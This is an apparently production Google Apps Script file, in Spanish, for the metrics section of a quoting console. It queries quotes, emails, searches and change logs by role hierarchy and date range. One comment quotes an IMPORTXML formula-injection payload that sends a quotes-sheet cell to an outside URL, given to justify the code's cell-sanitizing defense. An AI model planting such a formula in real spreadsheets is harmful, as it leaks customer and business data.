/**
 * =================================================================================================
 * MONITOREO — la sección «Métricas» de la consola | Sistema de cotizaciones Ventel
 * =================================================================================================
 * Fase 9 del plan de cierre (T9.4). Responde a «¿cuánto y quién?» sobre cuatro rastros que el
 * sistema ya dejaba y que hasta ahora no se podían consultar desde ninguna pantalla:
 *
 *   Cotizaciones   la hoja de siempre, filtrable por asesor, cliente, teléfono y fechas.
 *   Correos        la hoja MetricasCorreos: qué se mandó, a quién, a qué hora y si salió bien.
 *   Búsquedas      lo que el equipo escribe en el buscador. NO se guardaba en ningún sitio:
 *                  esta fase estrena la hoja y el registro (monRegistrarBusqueda_).
 *   Cambios        los apuntes de la consola, ya recortados por jerarquía.
 *
 * TRES REGLAS QUE ORDENAN TODO EL ARCHIVO:
 *
 *   1. NADA se calcula al abrir la consola. Cada consulta es una llamada aparte que el usuario
 *      pide. `consolaPanorama` ya es la lectura más cara de la app y leer «Cotizaciones» entera
 *      es lo más caro que hay: engordar el panorama con esto habría hecho lenta la consola para
 *      todo el mundo, incluido quien nunca abre esta pestaña.
 *
 *   2. SE LEE POR LA COLA, nunca la hoja entera. Las hojas crecen sin tope y nadie las vacía.
 *      Se recorre hacia atrás por lotes y se para cuando un lote entero queda por debajo del
 *      rango pedido, que es el patrón que ya usa la bitácora (Consola.gs).
 *
 *   3. EL RECORTE JERÁRQUICO ES DEL SERVIDOR. Un supervisor ve su nivel hacia abajo; el maestro
 *      ve todo. No se manda al cliente una lista completa para que la esconda: lo que no le toca
 *      no sale de aquí.
 *
 * Funciones expuestas al cliente (todas con el bloque 'metricas'):
 *   monPanorama(email)             → qué filtros existen y a quién alcanza esta persona
 *   monCotizaciones(email, filtros)
 *   monCorreos(email, filtros)
 *   monBusquedas(email, filtros)
 *   monCambios(email, filtros)
 *
 * Los .gs comparten un solo ámbito global: todo lo de aquí lleva prefijo `mon`.
 */

// ── HOJA DE BÚSQUEDAS ────────────────────────────────────────────────────────

var MON_BUSQ_SHEET   = 'MetricasBusquedas';
var MON_BUSQ_HEADERS = ['Fecha', 'Termino', 'Quien', 'Nombre', 'Origen', 'Resultados'];

/** Bloque que abre esta sección. Se acuerda aquí y se consolida en F13.1. */
var MON_BLOQUE = 'metricas';

/* Topes de lectura. Son la diferencia entre una consulta de tres segundos y una que se come el
   tiempo de ejecución: la hoja de cotizaciones no tiene fin y la de correos tampoco.

   Los dos hacen cosas distintas y conviene no confundirlos: CANDIDATAS son las filas completas
   que se está dispuesto a LEER (las que caen dentro del periodo, antes de aplicar filtros), y
   TOPE_FILAS son las que se está dispuesto a MANDAR a la pantalla ya filtradas. */
var MON_MAX_CANDIDATAS = 4000;   // filas completas que se leen como mucho por consulta
var MON_TOPE_FILAS     = 800;    // filas que como mucho vuelven a la pantalla

/** Ventana en la que lo que se sigue tecleando cuenta como la misma búsqueda. */
var MON_BUSQ_VENTANA = 45;   // segundos

/** Búsquedas por persona y hora que se apuntan. Freno de la escritura, no del buscador. */
var MON_BUSQ_POR_HORA = 200;

// ── UTILIDADES ───────────────────────────────────────────────────────────────

/** La hoja de búsquedas, creándola con sus encabezados la primera vez. */
function monBusquedasHoja_(crear) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sheet = ss.getSheetByName(MON_BUSQ_SHEET);
  if (sheet || !crear) return sheet;

  sheet = ss.insertSheet(MON_BUSQ_SHEET);
  sheet.getRange(1, 1, 1, MON_BUSQ_HEADERS.length).setValues([MON_BUSQ_HEADERS]);
  sheet.getRange(1, 1, 1, MON_BUSQ_HEADERS.length).setFontWeight('bold');
  sheet.setFrozenRows(1);
  sheet.setColumnWidth(1, 160);
  sheet.setColumnWidth(2, 280);
  sheet.setColumnWidth(3, 240);
  return sheet;
}

/** Índices de columna por NOMBRE de encabezado, tolerando acentos y mayúsculas. */
function monCols_(hdr, nombres) {
  const h = (hdr || []).map(function (x) {
    return String(x || '').toLowerCase().trim().normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]', 'g'), '');
  });
  const out = {};
  Object.keys(nombres).forEach(function (clave) {
    const busca = nombres[clave].map(function (n) {
      return n.toLowerCase().normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]', 'g'), '');
    });
    out[clave] = -1;
    for (let i = 0; i < h.length && out[clave] === -1; i++) {
      if (busca.indexOf(h[i]) !== -1) out[clave] = i;
    }
  });
  return out;
}

/** Texto normalizado para comparar sin acentos ni mayúsculas. */
function monPlano_(texto) {
  return String(texto == null ? '' : texto).toLowerCase().trim()
    .normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]', 'g'), '');
}

/** Solo dígitos: así «55 1234 5678», «55-1234-5678» y «5512345678» son el mismo teléfono. */
function monSoloDigitos_(texto) {
  return String(texto == null ? '' : texto).replace(/\D+/g, '');
}

/**
 * Deja un texto que viene de fuera **inerte** dentro de una celda.
 *
 * Una celda que empieza por `=`, `+`, `-` o `@` no es texto para Google Sheets: es una FÓRMULA,
 * y se evalúa con los permisos de quien abra el libro. Alguien que escriba
 * `=IMPORTXML("https://…?d="&Cotizaciones!C2, "//a")` en el buscador estaría metiendo una
 * fórmula viva en la hoja de métricas, con la hoja de cotizaciones al lado. Se le antepone un
 * apóstrofo, que es la forma que tiene Sheets de decir «esto es texto»: se ve igual al leerlo y
 * no se ejecuta. Lo mismo vale para el CSV que se descarga después y se abre en Excel.
 */
function monCeldaInerte_(texto) {
  const s = String(texto == null ? '' : texto);
  return /^[=+\-@\t\r]/.test(s) ? ("'" + s) : s;
}

function monFechaISO_(valor) {
  const d = (valor instanceof Date) ? valor : new Date(valor);
  return isNaN(d.getTime()) ? '' : d.toISOString();
}

/**
 * Rango de fechas de la consulta. Si no llegan fechas se toman los últimos 30 días: una
 * pantalla de métricas que arranca pidiendo «desde cuándo» no la usa nadie, y una que arranca
 * leyendo la hoja entera no la usa nadie dos veces.
 */
function monRango_(filtros) {
  filtros = filtros || {};
  const dia = function (d) {
    const p = function (n) { return (n < 10 ? '0' : '') + n; };
    return d.getFullYear() + '-' + p(d.getMonth() + 1) + '-' + p(d.getDate());
  };

  let desde = String(filtros.desde || '').trim();
  let hasta = String(filtros.hasta || '').trim();

  // Nada: los últimos treinta días. Una pantalla de métricas que arranca pidiendo «desde
  // cuándo» no la usa nadie, y una que arranca leyendo la hoja entera no la usa nadie dos veces.
  if (!desde && !hasta) {
    const hoy = new Date();
    hasta = dia(hoy);
    desde = dia(new Date(hoy.getTime() - 30 * 24 * 60 * 60 * 1000));
  }
  /* Media fecha NO se ignora en silencio. «Desde el 1 de enero» con el otro campo vacío
     significa «hasta hoy», y devolver los últimos treinta días con una nota que no lo menciona
     es contestar otra pregunta. Se completa la que falta y se dice cuál se completó. */
  let completado = '';
  if (desde && !hasta) { hasta = dia(new Date()); completado = 'hasta hoy'; }
  else if (!desde && hasta) {
    const fin = new Date(hasta + 'T00:00:00');
    const ini = isNaN(fin.getTime()) ? new Date() : new Date(fin.getTime() - 30 * 24 * 60 * 60 * 1000);
    desde = dia(ini);
    completado = 'los treinta días anteriores';
  }

  const r = consolaRangoFechas_(desde, hasta);
  if (!r.ok) return { ok: false, error: r.error };

  /* Horas, si vienen (T9.4 las pide junto al rango de fechas). Sin ellas, el día completo:
     de la medianoche del primero a las 23:59:59 del último, que es lo que la gente quiere
     decir cuando escribe dos fechas. */
  const hora = /^([01]\d|2[0-3]):([0-5]\d)$/;
  const hd = hora.exec(String(filtros.horaDesde || '').trim());
  const hh = hora.exec(String(filtros.horaHasta || '').trim());
  if (hd) r.desde.setHours(Number(hd[1]), Number(hd[2]), 0, 0);
  if (hh) r.hasta.setHours(Number(hh[1]), Number(hh[2]), 59, 999);
  if (r.desde > r.hasta) return { ok: false, error: 'La hora de inicio es posterior a la de fin.' };

  r.porDefecto = !filtros.desde && !filtros.hasta;
  r.completado = completado;
  r.conHoras = !!(hd || hh);
  return r;
}

// ── GATE Y ALCANCE ───────────────────────────────────────────────────────────

/**
 * Puerta de todas las consultas: sesión válida y sección 'metricas' concedida.
 * Devuelve además el ALCANCE ya resuelto, que es lo que decide qué filas se pueden ver.
 */
function monAcceso_(email) {
  const acc = consolaAcceso_(email, 'metricas');
  if (!acc.ok) return { ok: false, error: acc.error };
  acc.alcance = monAlcance_(acc);
  return acc;
}

/**
 * Correos que esta persona puede mirar.
 *
 * `null` = todos (maestro). Para cualquier otro perfil es un mapa {correo:true} con la gente
 * de su nivel hacia abajo, la misma regla que ya recortan consolaListaMiembros_ y la bitácora.
 * Se resuelve UNA vez por consulta y se consulta por clave: hacerlo fila a fila con
 * permUsuario_ sobre una hoja de miles de filas era la forma segura de tardar medio minuto.
 */
function monAlcance_(acc) {
  if (acc && acc.maestro) return null;

  const miNivel = acc ? acc.nivel : 1;
  const permitidos = {};
  const indice = secIndiceRegistros_();
  Object.keys(indice).forEach(function (correo) {
    let nivel = 1;
    try { nivel = permNivelUsuario_(permUsuario_(correo)); } catch (e) {}
    if (nivel <= miNivel) permitidos[correo] = true;
  });
  // La propia cuenta siempre entra, aunque su nivel se haya calculado raro.
  if (acc && acc.email) permitidos[String(acc.email).toLowerCase()] = true;
  return permitidos;
}

/**
 * ¿Puede ver una fila cuyo dueño es este correo?
 *
 * Con alcance nulo (maestro), todo. Con alcance, solo lo suyo y lo de abajo — y una fila SIN
 * dueño reconocible (el asesor ya no está dado de alta, o la columna venía vacía) NO se enseña:
 * es preferible que falte una fila a que un supervisor vea, por descarte, lo que hizo alguien
 * por encima de él.
 */
function monPuedeVer_(alcance, correo) {
  if (alcance === null) return true;
  const c = String(correo || '').trim().toLowerCase();
  return !!(c && alcance[c]);
}

/**
 * Devuelve las filas del rango que pasen el filtro, leyendo lo mínimo posible.
 *
 * EL MÉTODO, Y POR QUÉ NO ES EL OBVIO. Lo primero que se escribió aquí fue el patrón de la
 * bitácora: recorrer la hoja hacia atrás por lotes y parar al llegar por debajo del rango. Para
 * «los últimos treinta días» funciona; para «enero del año pasado» es un desastre, y de los
 * silenciosos: TODAS las filas entre hoy y enero cumplen «no es anterior al rango», así que no
 * se para nunca, se lee al ancho completo hasta el techo, y la consulta contesta **vacío**
 * habiendo leído doce mil renglones sin llegar al periodo. Se lee como «no hubo nada en enero».
 *
 * Lo que se hace ahora son dos pasadas:
 *
 *   1. Se lee SOLO la columna de fechas de toda la hoja. Es una llamada y una celda por fila:
 *      cuarenta mil fechas cuestan una fracción de lo que cuestan cuarenta mil filas de veinte
 *      columnas, y con ellas ya se sabe exactamente qué renglones caen dentro.
 *   2. Se leen las filas completas SOLO de esos renglones, agrupados en tramos contiguos para
 *      no hacer una llamada por fila.
 *
 * Es exacto además de barato: no hay heurística de parada, así que una fila editada —que
 * conserva su sitio y estrena fecha— aparece igual que las demás.
 *
 * @param {Sheet} sheet
 * @param {number} iFecha   índice (0-based) de la columna de fecha por la que se acota.
 * @param {Date} desde
 * @param {Date} hasta
 * @param {function(Array, Date):Object|null} mapear  fila cruda → objeto de salida, o null.
 * @return {{filas:Array, truncado:boolean, leidas:number, candidatas:number}}
 */
function monRecorrer_(sheet, iFecha, desde, hasta, mapear) {
  const salida = { filas: [], truncado: false, leidas: 0, candidatas: 0 };
  if (!sheet || sheet.getLastRow() < 2) return salida;

  const ultima = sheet.getLastRow();
  const ancho = Math.max(sheet.getLastColumn(), 1);

  // 1) Solo la columna de fechas. Aquí `leidas` cuenta renglones mirados, no celdas.
  const fechas = sheet.getRange(2, iFecha + 1, ultima - 1, 1).getValues();
  salida.leidas = fechas.length;

  const dentro = [];
  for (let i = fechas.length - 1; i >= 0; i--) {   // del más reciente al más viejo
    const v = fechas[i][0];
    const cuando = (v instanceof Date) ? v : new Date(v);
    if (isNaN(cuando.getTime())) continue;
    if (cuando < desde || cuando > hasta) continue;
    dentro.push({ fila: i + 2, cuando: cuando });
    /* El tope de aquí NO es el de filas devueltas, y la diferencia importa: el filtro por
       asesor o por cliente se aplica DESPUÉS, al mapear. Si se cortara en las 800 que se
       enseñan, una consulta con filtro estrecho sobre un año entero se quedaría con las 800
       más recientes del periodo y descartaría, sin decirlo, las que sí cumplían más atrás.
       Este techo es el de filas completas que se está dispuesto a leer. */
    if (dentro.length >= MON_MAX_CANDIDATAS) { salida.truncado = true; break; }
  }
  salida.candidatas = dentro.length;
  if (!dentro.length) return salida;

  // 2) Las filas completas, en tramos contiguos. Un hueco pequeño se lee entero: leer tres
  //    filas de más sale más barato que una segunda llamada al servicio.
  dentro.sort(function (a, b) { return a.fila - b.fila; });
  const tramos = [];
  let ini = dentro[0].fila, prev = ini;
  for (let i = 1; i < dentro.length; i++) {
    const f = dentro[i].fila;
    if (f - prev > 20) { tramos.push([ini, prev]); ini = f; }
    prev = f;
  }
  tramos.push([ini, prev]);

  const quiero = {};
  dentro.forEach(function (d) { quiero[d.fila] = d.cuando; });

  const recogidas = [];
  tramos.forEach(function (t) {
    const datos = sheet.getRange(t[0], 1, t[1] - t[0] + 1, ancho).getValues();
    for (let i = 0; i < datos.length; i++) {
      const fila = t[0] + i;
      if (!quiero[fila]) continue;
      const obj = mapear(datos[i], quiero[fila]);
      if (obj) recogidas.push({ fila: fila, obj: obj });
    }
  });

  // De vuelta en el orden en que se lee una lista de actividad: lo más reciente arriba.
  recogidas.sort(function (a, b) { return b.fila - a.fila; });
  if (recogidas.length > MON_TOPE_FILAS) {
    recogidas.length = MON_TOPE_FILAS;
    salida.truncado = true;
  }
  salida.filas = recogidas.map(function (r) { return r.obj; });
  return salida;
}

// ── REGISTRO DE BÚSQUEDAS ────────────────────────────────────────────────────

/**
 * Apunta una búsqueda. NUNCA revienta ni frena a quien buscaba: si algo falla, se queda en el
 * registro de ejecución y la búsqueda sigue su camino (mismo criterio que metRegistrarEnvio_).
 *
 * DOS CUIDADOS QUE NO SON OPCIONALES:
 *
 *   · Ventana antirrepetición. El buscador de la paleta dispara mientras se teclea: sin esto,
 *     escribir «devoluciones» dejaba doce filas y convertía el registro en ruido, además de
 *     cobrarle un appendRow a cada pulsación. Dos búsquedas iguales de la misma persona dentro
 *     de MON_BUSQ_VENTANA cuentan como una.
 *
 *   · Aquí NO se llama a cotInvalidarCache_. metRegistrarEnvio_ sí lo hace, y con razón —un
 *     envío cambia el estado de una cotización—; pero una búsqueda no cambia nada, y tirar la
 *     caché de cotizaciones en cada búsqueda haría lento justo lo que se está midiendo.
 *
 * @param {string} termino  lo que se escribió.
 * @param {string} email    correo declarado por el navegador; se verifica antes de escribirlo.
 * @param {string} origen   'cotizaciones' | 'paleta' | 'portal'…
 * @param {number=} resultados  cuántos salieron, si se sabe.
 */
function monRegistrarBusqueda_(termino, email, origen, resultados) {
  try {
    const texto = String(termino == null ? '' : termino).trim();
    if (texto.length < 3) return;               // lo mismo que ignora el buscador
    if (texto.length > 120) return;             // eso no es una búsqueda

    /* SIN SESIÓN NO SE APUNTA NADA, y esta es la línea que más importa del archivo.
       `getQuotesForUser` no tiene gate —la búsqueda de folios es global a propósito— y la webapp
       se sirve a todo el dominio, así que sin esta guarda cualquiera podría escribir en una hoja
       del libro de cotizaciones, tantas veces como quisiera, sin estar dado de alta. Un registro
       de métricas no puede ser el único sitio del sistema donde se escribe sin sesión. Se pierde
       la búsqueda de quien no ha entrado, que además no puede encontrar nada. */
    let quien = '', nombre = '';
    try {
      const id = secIdentidad_(email);
      if (id.ok) { quien = id.email; nombre = id.nombre || ''; }
    } catch (e) {}
    if (!quien) return;

    /* TOPE POR PERSONA. Es una escritura a hoja disparada por teclear, así que necesita freno
       propio: el mismo criterio que `reportBrokenLink` (Portal.gs), que es la otra escritura
       del proyecto que arranca de un gesto del usuario. Sin él, un bucle de términos distintos
       añade una fila por llamada y la hoja crece sin tope. */
    if (typeof secIntentosRevisar_ === 'function') {
      const claveTope = 'busq_' + quien;
      if (secIntentosRevisar_(claveTope, MON_BUSQ_POR_HORA, 3600).bloqueado) return;
      secIntentosSumar_(claveTope, 3600);
    }

    const sheet = monBusquedasHoja_(true);
    const cache = (function () { try { return CacheService.getScriptCache(); } catch (e) { return null; } })();
    const clave = 'monbus_' + (typeof cotHash_ === 'function' ? cotHash_(quien) : quien.replace(/\W+/g, ''));
    const plano = monPlano_(texto);

    /* MIENTRAS SE TECLEA, LA FILA SE AFINA EN VEZ DE MULTIPLICARSE.
       El buscador de la paleta dispara con antirrebote, así que escribir «devoluciones» manda
       «dev», «devolu», «devoluci»… La primera versión comparaba el término EXACTO, de modo que
       cada prefijo era una búsqueda distinta y dejaba cinco filas por una sola intención. Ahora
       se recuerda la última fila de esta persona y, si lo nuevo es la continuación de lo
       anterior —o al revés, porque también se borran letras—, se REESCRIBE esa fila con el
       término más largo. Se comprueba antes que la fila siga siendo suya: entre medias ha
       podido escribir alguien más. */
    let previa = null;
    if (cache) { try { previa = JSON.parse(cache.get(clave) || 'null'); } catch (e) {} }

    if (previa && previa.fila && previa.t &&
        (plano.indexOf(previa.t) === 0 || previa.t.indexOf(plano) === 0)) {
      const ancho = Math.max(sheet.getLastColumn(), MON_BUSQ_HEADERS.length);
      const c = monCols_(sheet.getRange(1, 1, 1, ancho).getValues()[0],
                         { termino: ['termino'], quien: ['quien'], resultados: ['resultados'] });
      const suya = c.quien > -1 && previa.fila <= sheet.getLastRow() &&
                   String(sheet.getRange(previa.fila, c.quien + 1).getValue() || '').toLowerCase() === quien;
      if (suya) {
        const largo = plano.length >= previa.t.length ? texto : previa.texto;
        if (c.termino > -1) sheet.getRange(previa.fila, c.termino + 1).setValue(monCeldaInerte_(largo));
        if (c.resultados > -1 && resultados !== undefined && resultados !== null) {
          sheet.getRange(previa.fila, c.resultados + 1).setValue(Number(resultados));
        }
        if (cache) {
          cache.put(clave, JSON.stringify({ t: plano.length >= previa.t.length ? plano : previa.t,
                                            texto: largo, fila: previa.fila }), MON_BUSQ_VENTANA);
        }
        return;
      }
    }

    sheet.appendRow([
      new Date(), monCeldaInerte_(texto), quien, nombre, monCeldaInerte_(String(origen || '')),
      (resultados === undefined || resultados === null) ? '' : Number(resultados)
    ]);
    if (cache) {
      try { cache.put(clave, JSON.stringify({ t: plano, texto: texto, fila: sheet.getLastRow() }), MON_BUSQ_VENTANA); }
      catch (e) {}
    }
  } catch (e) {
    Logger.log('monRegistrarBusqueda_ no pudo registrar «' + termino + '»: ' + e);
  }
}

// ── CONSULTAS ────────────────────────────────────────────────────────────────

/**
 * Lo que la pestaña necesita para dibujarse: quién es, hasta dónde alcanza y con qué se puede
 * filtrar. Es deliberadamente barato —no toca ni cotizaciones ni correos—, porque se pide al
 * abrir la pestaña y las consultas de verdad las pide el usuario.
 */
function monPanorama(email) {
  try {
    const acc = monAcceso_(email);
    if (!acc.ok) return { success: false, message: acc.error };

    const indice = secIndiceRegistros_();
    const personas = Object.keys(indice)
      .filter(function (c) { return monPuedeVer_(acc.alcance, c); })
      .map(function (c) { return { email: c, nombre: indice[c].nombre || '' }; })
      .sort(function (a, b) { return (a.nombre || a.email).localeCompare(b.nombre || b.email, 'es'); });

    const hoy = new Date();
    const hace30 = new Date(hoy.getTime() - 30 * 24 * 60 * 60 * 1000);
    const fmt = function (d) { return Utilities.formatDate(d, Session.getScriptTimeZone(), 'yyyy-MM-dd'); };

    return {
      success: true,
      yo: { email: acc.email, nombre: acc.nombre, maestro: acc.maestro === true, nivel: acc.nivel },
      // El rótulo honesto de la pantalla: «12 personas» a secas es mentira cuando el sistema
      // tiene 40 y esta persona solo alcanza a 12. Mismo criterio que consolaResumen_.
      alcance: acc.maestro ? 'sistema' : 'jerarquia',
      personas: personas,
      tiposCorreo: ['Cotización (PDF)', 'Plantilla cliente', 'Difusión'],
      rangoPorDefecto: { desde: fmt(hace30), hasta: fmt(hoy) },
      topes: { filas: MON_TOPE_FILAS, candidatas: MON_MAX_CANDIDATAS }
    };
  } catch (e) {
    Logger.log('monPanorama error: ' + e);
    return { success: false, message: 'No pudimos preparar la sección de métricas. Inténtalo de nuevo en un momento.' };
  }
}

/**
 * Cotizaciones del rango, con los filtros de T9.4: asesor, correo del cliente, teléfono y texto
 * libre (folio o nombre). Es la consulta más cara de la sección y por eso es la que más se
 * acota: rango obligatorio —por omisión, treinta días— y lectura por la cola.
 */
function monCotizaciones(email, filtros) {
  try {
    const acc = monAcceso_(email);
    if (!acc.ok) return { success: false, message: acc.error };

    const rango = monRango_(filtros);
    if (!rango.ok) return { success: false, message: rango.error };
    filtros = filtros || {};

    const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(COTIZACIONES_SHEET_NAME);
    if (!sheet) return { success: false, message: 'No encontramos la hoja de cotizaciones.' };

    const hdr = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
    const c = monCols_(hdr, {
      folio: ['folio'], fecha: ['timestamp', 'fecha'], asesor: ['asesorcorreo'],
      asesorNombre: ['asesornombre'], cliente: ['clientenombre'], correo: ['correocliente'],
      telefono: ['numero', 'telefono'], total: ['totalgeneral'], estatus: ['estatus'],
      envio: ['fechaenvio']
    });
    if (c.fecha === -1 || c.folio === -1) {
      return { success: false, message: 'La hoja de cotizaciones no tiene las columnas Folio y Timestamp.' };
    }

    const fAsesor = monPlano_(filtros.asesor);
    const fCorreo = monPlano_(filtros.cliente);
    const fTel    = monSoloDigitos_(filtros.telefono);
    const fTexto  = monPlano_(filtros.texto);

    const r = monRecorrer_(sheet, c.fecha, rango.desde, rango.hasta, function (f, cuando) {
      const asesor = String(c.asesor > -1 ? f[c.asesor] : '').trim().toLowerCase();
      if (!monPuedeVer_(acc.alcance, asesor)) return null;
      if (fAsesor && asesor !== fAsesor) return null;
      if (fCorreo && monPlano_(c.correo > -1 ? f[c.correo] : '').indexOf(fCorreo) === -1) return null;
      if (fTel && monSoloDigitos_(c.telefono > -1 ? f[c.telefono] : '').indexOf(fTel) === -1) return null;
      if (fTexto) {
        const pajar = monPlano_((c.folio > -1 ? f[c.folio] : '') + ' ' + (c.cliente > -1 ? f[c.cliente] : ''));
        if (pajar.indexOf(fTexto) === -1) return null;
      }
      return {
        folio: String(c.folio > -1 ? f[c.folio] : ''),
        fecha: cuando.toISOString(),
        asesor: asesor,
        asesorNombre: String(c.asesorNombre > -1 ? f[c.asesorNombre] : ''),
        cliente: String(c.cliente > -1 ? f[c.cliente] : ''),
        correo: String(c.correo > -1 ? f[c.correo] : ''),
        telefono: String(c.telefono > -1 ? f[c.telefono] : ''),
        total: Number(c.total > -1 ? f[c.total] : 0) || 0,
        estatus: String(c.estatus > -1 ? f[c.estatus] : ''),
        envio: c.envio > -1 ? monFechaISO_(f[c.envio]) : ''
      };
    });

    return monRespuesta_(r, rango, { total: r.filas.reduce(function (s, q) { return s + q.total; }, 0) });
  } catch (e) {
    Logger.log('monCotizaciones error: ' + e);
    return { success: false, message: 'No pudimos leer las cotizaciones de ese periodo. Prueba con un rango más corto.' };
  }
}

/** Correos enviados del rango, sobre la hoja MetricasCorreos. */
function monCorreos(email, filtros) {
  try {
    const acc = monAcceso_(email);
    if (!acc.ok) return { success: false, message: acc.error };

    const rango = monRango_(filtros);
    if (!rango.ok) return { success: false, message: rango.error };
    filtros = filtros || {};

    const sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(MET_SHEET_NAME);
    if (!sheet) return monRespuesta_({ filas: [], truncado: false, leidas: 0 }, rango, {});

    const hdr = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
    const c = monCols_(hdr, {
      fecha: ['fecha'], tipo: ['tipo'], referencia: ['referencia'], asesor: ['asesoremail'],
      asesorNombre: ['asesornombre'], para: ['para'], destinatarios: ['destinatarios'],
      cc: ['cc'], cco: ['cco'], asunto: ['asunto'], adjuntos: ['adjuntos'],
      remitente: ['remitente'], resultado: ['resultado'], detalle: ['detalle'],
      plantilla: ['plantillamodificada']
    });
    if (c.fecha === -1) return { success: false, message: 'La hoja de correos no tiene columna Fecha.' };

    const fAsesor = monPlano_(filtros.asesor);
    const fTipo   = monPlano_(filtros.tipo);
    const fTexto  = monPlano_(filtros.texto);
    const soloErrores = filtros.soloErrores === true;

    const r = monRecorrer_(sheet, c.fecha, rango.desde, rango.hasta, function (f, cuando) {
      const asesor = String(c.asesor > -1 ? f[c.asesor] : '').trim().toLowerCase();
      if (!monPuedeVer_(acc.alcance, asesor)) return null;
      if (fAsesor && asesor !== fAsesor) return null;
      if (fTipo && monPlano_(c.tipo > -1 ? f[c.tipo] : '') !== fTipo) return null;

      const resultado = String(c.resultado > -1 ? f[c.resultado] : '');
      const bien = /enviad/i.test(resultado);
      if (soloErrores && bien) return null;
      if (fTexto) {
        const pajar = monPlano_((c.asunto > -1 ? f[c.asunto] : '') + ' ' +
                                (c.para > -1 ? f[c.para] : '') + ' ' +
                                (c.referencia > -1 ? f[c.referencia] : ''));
        if (pajar.indexOf(fTexto) === -1) return null;
      }
      return {
        fecha: cuando.toISOString(),
        tipo: String(c.tipo > -1 ? f[c.tipo] : ''),
        referencia: String(c.referencia > -1 ? f[c.referencia] : ''),
        asesor: asesor,
        asesorNombre: String(c.asesorNombre > -1 ? f[c.asesorNombre] : ''),
        para: String(c.para > -1 ? f[c.para] : ''),
        destinatarios: Number(c.destinatarios > -1 ? f[c.destinatarios] : 0) || 0,
        cc: Number(c.cc > -1 ? f[c.cc] : 0) || 0,
        cco: Number(c.cco > -1 ? f[c.cco] : 0) || 0,
        asunto: String(c.asunto > -1 ? f[c.asunto] : ''),
        adjuntos: Number(c.adjuntos > -1 ? f[c.adjuntos] : 0) || 0,
        remitente: String(c.remitente > -1 ? f[c.remitente] : ''),
        resultado: resultado,
        detalle: String(c.detalle > -1 ? f[c.detalle] : ''),
        // '' cuando la columna no existe todavía o el envío no traía con qué comparar.
        plantillaModificada: String(c.plantilla > -1 ? f[c.plantilla] : ''),
        ok: bien
      };
    });

    const errores = r.filas.filter(function (x) { return !x.ok; }).length;
    return monRespuesta_(r, rango, { errores: errores, enviados: r.filas.length - errores });
  } catch (e) {
    Logger.log('monCorreos error: ' + e);
    return { success: false, message: 'No pudimos leer los correos de ese periodo. Prueba con un rango más corto.' };
  }
}

/** Búsquedas registradas en el rango. La hoja la estrena esta fase: antes no se guardaban. */
function monBusquedas(email, filtros) {
  try {
    const acc = monAcceso_(email);
    if (!acc.ok) return { success: false, message: acc.error };

    const rango = monRango_(filtros);
    if (!rango.ok) return { success: false, message: rango.error };
    filtros = filtros || {};

    const sheet = monBusquedasHoja_(false);
    if (!sheet) {
      return monRespuesta_({ filas: [], truncado: false, leidas: 0 }, rango,
        { aviso: 'Todavía no hay búsquedas registradas. Se empiezan a guardar desde que se publicó esta versión.' });
    }

    const hdr = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
    const c = monCols_(hdr, {
      fecha: ['fecha'], termino: ['termino'], quien: ['quien'], nombre: ['nombre'],
      origen: ['origen'], resultados: ['resultados']
    });
    if (c.fecha === -1) return { success: false, message: 'La hoja de búsquedas no tiene columna Fecha.' };

    const fQuien = monPlano_(filtros.asesor);
    const fTexto = monPlano_(filtros.texto);

    const r = monRecorrer_(sheet, c.fecha, rango.desde, rango.hasta, function (f, cuando) {
      const quien = String(c.quien > -1 ? f[c.quien] : '').trim().toLowerCase();
      // Las búsquedas anónimas (sin sesión resuelta) solo las ve el maestro: no hay forma de
      // saber de quién son, y por tanto tampoco de decidir si le tocan a este supervisor.
      if (!quien) { if (acc.alcance !== null) return null; }
      else if (!monPuedeVer_(acc.alcance, quien)) return null;
      if (fQuien && quien !== fQuien) return null;

      const termino = String(c.termino > -1 ? f[c.termino] : '');
      if (fTexto && monPlano_(termino).indexOf(fTexto) === -1) return null;

      return {
        fecha: cuando.toISOString(),
        termino: termino,
        quien: quien,
        nombre: String(c.nombre > -1 ? f[c.nombre] : ''),
        origen: String(c.origen > -1 ? f[c.origen] : ''),
        resultados: c.resultados > -1 && f[c.resultados] !== '' ? Number(f[c.resultados]) : null
      };
    });

    // Lo más buscado del periodo: es la pregunta real («¿qué no encuentra el equipo?»), y se
    // calcula sobre lo que ya se leyó, sin una segunda pasada por la hoja.
    const cuenta = {};
    r.filas.forEach(function (b) {
      const clave = monPlano_(b.termino);
      if (!clave) return;
      if (!cuenta[clave]) cuenta[clave] = { termino: b.termino, veces: 0 };
      cuenta[clave].veces++;
    });
    const top = Object.keys(cuenta).map(function (k) { return cuenta[k]; })
      .sort(function (a, b) { return b.veces - a.veces; }).slice(0, 15);

    return monRespuesta_(r, rango, { top: top });
  } catch (e) {
    Logger.log('monBusquedas error: ' + e);
    return { success: false, message: 'No pudimos leer las búsquedas de ese periodo.' };
  }
}

/**
 * Cambios de personas y de la instalación, del mismo rango.
 *
 * Reutiliza la lectura de la bitácora (Consola.gs) en vez de releer la hoja por su cuenta:
 * ahí vive el recorte jerárquico de los apuntes, y una segunda copia de una regla de seguridad
 * es una regla que un día solo se corrige en uno de los dos sitios.
 */
function monCambios(email, filtros) {
  try {
    const acc = monAcceso_(email);
    if (!acc.ok) return { success: false, message: acc.error };

    const rango = monRango_(filtros);
    if (!rango.ok) return { success: false, message: rango.error };
    filtros = filtros || {};

    const r = consolaBitacoraEnRango_(rango.desde, rango.hasta, acc.usuario);

    const fQuien = monPlano_(filtros.asesor);
    const fTexto = monPlano_(filtros.texto);
    const filas = r.filas.filter(function (b) {
      if (fQuien && monPlano_(b.quien) !== fQuien) return false;
      if (fTexto) {
        const pajar = monPlano_(b.accion + ' ' + b.objetivo + ' ' + b.detalle + ' ' + b.quien);
        if (pajar.indexOf(fTexto) === -1) return false;
      }
      return true;
    });

    return monRespuesta_({ filas: filas, truncado: r.truncado, leidas: r.leidas }, rango, {});
  } catch (e) {
    Logger.log('monCambios error: ' + e);
    return { success: false, message: 'No pudimos leer los cambios de ese periodo.' };
  }
}

/**
